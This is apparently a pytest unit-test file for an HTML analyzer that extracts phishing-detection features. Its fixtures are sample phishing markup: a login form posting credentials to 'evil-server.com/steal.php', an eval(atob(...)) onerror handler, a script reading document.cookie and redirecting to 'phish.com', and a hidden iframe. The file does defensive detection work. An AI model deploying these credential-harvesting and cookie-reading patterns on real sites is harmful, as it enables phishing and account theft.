"""Unit tests for the HTML/DOM Analyzer module.

Tests extraction of all 28 HTML features on sample HTML snippets
(login forms, obfuscated JS, external resources, empty links, iframe, etc.).
"""

import pytest
from backend.app.analyzers.html_analyzer import (
    HTML_FEATURE_NAMES,
    NUM_HTML_FEATURES,
    HTMLAnalyzer,
    HTMLFeatures,
)


@pytest.fixture
def analyzer() -> HTMLAnalyzer:
    """Fixture providing HTMLAnalyzer instance."""
    return HTMLAnalyzer()


class TestHTMLAnalyzer:
    """Test suite for HTML feature extraction."""

    def test_feature_count_and_names(self, analyzer: HTMLAnalyzer) -> None:
        """Verify HTML feature vector length is exactly 28."""
        sample_html = "<html><head><title>Test</title></head><body><h1>Hello</h1></body></html>"
        result = analyzer.extract_features(sample_html)
        assert len(result.features) == NUM_HTML_FEATURES
        assert set(result.features.keys()) == set(HTML_FEATURE_NAMES)

    def test_login_form_extraction(self, analyzer: HTMLAnalyzer) -> None:
        """Verify login form, password field, and credential score detection."""
        html = """
        <html>
            <body>
                <form action="http://evil-server.com/steal.php" method="POST">
                    <input type="text" name="username" placeholder="Enter Email">
                    <input type="password" name="password">
                    <input type="hidden" name="csrf" value="123">
                    <button type="submit">Login</button>
                </form>
            </body>
        </html>
        """
        result = analyzer.extract_features(html, url="https://legitimate-bank.com")
        assert result.features["num_forms"] == 1
        assert result.features["num_password_fields"] == 1
        assert result.features["num_hidden_fields"] == 1
        assert result.features["has_login_form"] is True
        assert result.features["form_action_external_ratio"] == 1.0
        assert result.features["credential_collection_score"] > 3.0

    def test_suspicious_js_patterns(self, analyzer: HTMLAnalyzer) -> None:
        """Verify detection of suspicious JS patterns and inline event handlers."""
        html = """
        <html>
            <body>
                <img src="x" onerror="eval(atob('YWxlcnQoMSk='))">
                <script>
                    var c = document.cookie;
                    window.location = "http://phish.com";
                </script>
            </body>
        </html>
        """
        result = analyzer.extract_features(html)
        assert result.features["script_count"] == 1
        assert result.features["inline_js_count"] == 1
        assert result.features["suspicious_js_pattern_count"] >= 2
        assert result.features["event_handler_count"] >= 1

    def test_external_resources(self, analyzer: HTMLAnalyzer) -> None:
        """Verify external images, stylesheets, and domain counting."""
        html = """
        <html>
            <head>
                <link rel="stylesheet" href="https://cdn.bootstrap.com/style.css">
                <link rel="icon" href="https://other-domain.com/favicon.ico">
            </head>
            <body>
                <img src="https://images.cdn.com/logo.png">
                <img src="/local_logo.png">
            </body>
        </html>
        """
        result = analyzer.extract_features(html, url="https://mybank.com")
        assert result.features["external_stylesheet_count"] == 1
        assert result.features["external_image_count"] == 1
        assert result.features["external_domain_count"] >= 2
        assert result.features["favicon_external"] is True

    def test_empty_and_suspicious_links(self, analyzer: HTMLAnalyzer) -> None:
        """Verify empty hrefs (#, javascript:void(0)) and external link ratio."""
        html = """
        <html>
            <body>
                <a href="#">Link 1</a>
                <a href="javascript:void(0)">Link 2</a>
                <a href="https://google.com">External</a>
                <a href="/about">Internal</a>
            </body>
        </html>
        """
        result = analyzer.extract_features(html, url="https://mybank.com")
        assert result.features["anchor_count"] == 4
        assert result.features["empty_link_count"] == 2
        assert result.features["suspicious_href_count"] == 1
        assert result.features["external_link_ratio"] == 0.25

    def test_iframe_and_meta_refresh(self, analyzer: HTMLAnalyzer) -> None:
        """Verify hidden iframe and meta refresh tags."""
        html = """
        <html>
            <head>
                <meta http-equiv="refresh" content="5;url=http://redirect.com">
            </head>
            <body>
                <iframe src="http://hidden-phish.com" width="0" height="0"></iframe>
            </body>
        </html>
        """
        result = analyzer.extract_features(html)
        assert result.features["iframe_count"] == 1
        assert result.features["meta_refresh_present"] is True

    def test_empty_html_handling(self, analyzer: HTMLAnalyzer) -> None:
        """Verify empty HTML yields defaults without failure."""
        result = analyzer.extract_features("")
        assert len(result.errors) > 0
        assert len(result.features) == NUM_HTML_FEATURES
